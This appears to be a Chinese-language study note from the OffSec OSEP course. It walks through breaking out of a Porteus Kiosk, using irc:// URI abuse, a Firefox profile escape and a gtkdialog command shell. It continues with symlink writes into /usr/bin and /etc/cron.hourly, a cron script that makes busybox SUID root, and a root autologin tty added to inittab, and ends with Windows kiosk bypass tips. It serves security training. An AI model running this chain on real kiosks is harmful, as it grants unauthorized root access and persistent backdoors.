---
title: OSEP-12-Porteus-Kiosk案例
description: '12-Kiosk突破 | 02-Porteus-Kiosk案例'
pubDate: 2026-01-30T00:02:04+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
---

# Porteus Kiosk 突破案例

## 1. 环境枚举

### 安装VNC客户端
```bash
sudo apt install tigervnc-viewer
xtigervncviewer
```

### 键盘快捷键测试
```
Alt+Tab - 切换应用
Ctrl+Alt+F3 - 切换TTY (可能被禁用)
```

---

## 2. 浏览器枚举

### Firefox内部关键字
```
about:config
about:preferences
file:///var/www/localhost/
```

### URI协议测试
```
file://
chrome://
ftp://
mailto:
smb://
irc://  <- 可能触发外部应用对话框
```

---

## 3. irc:// URI突破

### 触发应用选择对话框
```
在地址栏输入: irc://myhost
```

### 文件系统浏览
```
1. 点击 "Choose..." 选择应用
2. 点击 "Home" 查看用户目录
3. 点击 "Other Locations" -> "Computer" 浏览根目录
```

### 常见可执行文件位置
```
/bin/bash
/bin/busybox
/usr/bin/firefox
/usr/bin/gtkdialog
/usr/bin/dunstify
/usr/bin/env
```

---

## 4. Firefox配置文件突破

### 使用新配置文件启动Firefox
```
URI: irc://myhost -P "haxor"
应用: /usr/bin/firefox
```

### 创建新配置文件
```
1. 在配置文件管理器中创建 "haxor" 配置文件
2. 新Firefox实例将不受限制
3. 可以访问菜单和开发者工具
```

---

## 5. 系统信息枚举

### 使用file:// URI读取文件
```
file:///etc/passwd
file:///proc/version
file:///home/guest/.ssh/
```

### /etc/passwd 分析
```
有效登录用户:
- root
- operator
- guest (Kiosk用户)
```

---

## 6. Scratchpad文件写入

### 访问Scratchpad
```
菜单 -> Web Developer -> Scratchpad
```

### 保存文件
```
1. 写入内容
2. 文件 -> 保存
3. 更改文件类型为 "All Files"
4. 保存到 /home/guest/
```

---

## 7. gtkdialog命令执行

### 测试窗口代码
```xml
<window>
  <vbox>
    <frame Description>
      <text>
        <label>This is an example window.</label>
      </text>
    </frame>
    <hbox>
      <button ok>
        <action>echo "testing gtk" > /tmp/gtkoutput.txt</action>
      </button>
      <button cancel></button>
    </hbox>
  </vbox>
</window>
```

### 运行gtkdialog
```
URI: irc://myhost -f /home/guest/mywindow
应用: /usr/bin/gtkdialog
```

---

## 8. 自制终端

### 终端窗口代码
```xml
<window>
  <vbox>
    <vbox scrollable="true" width="500" height="400">
      <edit>
        <variable>CMDOUTPUT</variable>
        <input file>/tmp/termout.txt</input>
      </edit>
    </vbox>
    <hbox>
      <text><label>Command:</label></text>
      <entry><variable>CMDTORUN</variable></entry>
      <button>
        <label>Run!</label>
        <action>$CMDTORUN > /tmp/termout.txt</action>
        <action>refresh:CMDOUTPUT</action>
      </button>
    </hbox>
  </vbox>
</window>
```

### 保存并运行
```bash
# 保存为 /home/guest/terminal.txt
# 运行: irc://myhost -f /home/guest/terminal.txt
# 应用: /usr/bin/gtkdialog
```

---

## 9. 权限提升

### 查找SUID二进制文件
```bash
find / -perm -u=s -exec ls -al {} +
```

### 查看运行进程
```bash
ps aux | grep root
```

### Openbox窗口管理器
```bash
# 重启X会话
openbox --replace
```

---

## 10. 符号链接攻击

### 备份配置文件目录
```bash
mv /home/guest/.mozilla/firefox/c3pp43bg.default /home/guest/.mozilla/firefox/old_prof
```

### 创建符号链接
```bash
# 链接到可写目录
ln -s /usr/bin /home/guest/.mozilla/firefox/c3pp43bg.default

# 重启X会话
openbox --replace

# bookmarks.html 将被写入 /usr/bin
```

### 使文件可执行
```bash
chmod +x /usr/bin/bookmarks.html
```

---

## 11. Cron提权

### 创建符号链接到cron.hourly
```bash
rm /home/guest/.mozilla/firefox/c3pp43bg.default
ln -s /etc/cron.hourly /home/guest/.mozilla/firefox/c3pp43bg.default
openbox --replace
```

### 创建SUID后门脚本
```bash
# 使用Scratchpad创建脚本
echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html
echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
```

### 使用SUID busybox
```bash
# 复制busybox
cp /bin/busybox /home/guest/busybox

# 等待cron执行后
/home/guest/busybox sh /home/guest/runterminal.sh
```

---

## 12. 获取TTY终端

### 修改Xorg配置
```bash
# 复制配置文件
cp /etc/X11/xorg.conf.d/10-xorg.conf /home/guest/xorg.txt
chmod 777 /home/guest/xorg.txt

# 注释掉 DontVTSwitch
# 保存并复制回去
cp /home/guest/xorg.txt /etc/X11/xorg.conf.d/10-xorg.conf
chmod 644 /etc/X11/xorg.conf.d/10-xorg.conf
```

### 修改inittab
```bash
cp /etc/inittab /home/guest/inittab.txt
chmod 777 /home/guest/inittab.txt

# 添加TTY配置
c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linux

cp /home/guest/inittab.txt /etc/inittab
chmod 600 /etc/inittab

# 重新加载
/sbin/init q
```

### VNC切换到TTY
```bash
#!/bin/bash
killall x11vnc
x11vnc -rawfb vt3
```

---

## 13. Windows Kiosk技术

### 环境变量
```
%APPDATA%        -> C:\Users\Username\AppData\Roaming
%COMSPEC%        -> C:\Windows\System32\cmd.exe
%HOMEDRIVE%      -> C:\
%PROGRAMFILES%   -> C:\Program Files
%SystemRoot%     -> C:\Windows
%TEMP%           -> C:\Users\Username\Local Settings\Temp
%USERPROFILE%    -> C:\Users\Username
%WINDIR%         -> C:\Windows
```

### UNC路径
```
\\127.0.0.1\C$\Windows\System32\
\\localhost\admin$
```

### Shell快捷方式
```
shell:System           -> 系统文件夹
shell:Common Start Menu -> 公共开始菜单
shell:Downloads        -> 下载文件夹
shell:MyComputerFolder -> 此电脑
```

### 键盘快捷键
```
F1              -> 帮助
Ctrl+P          -> 打印对话框
Alt+Tab         -> 任务切换
Win+R           -> 运行
Ctrl+Shift+Esc  -> 任务管理器
Ctrl+Alt+Delete -> 锁屏菜单
```

### 绕过应用黑名单
```
1. 复制受限二进制文件
2. 重命名
3. 运行重命名后的文件
```
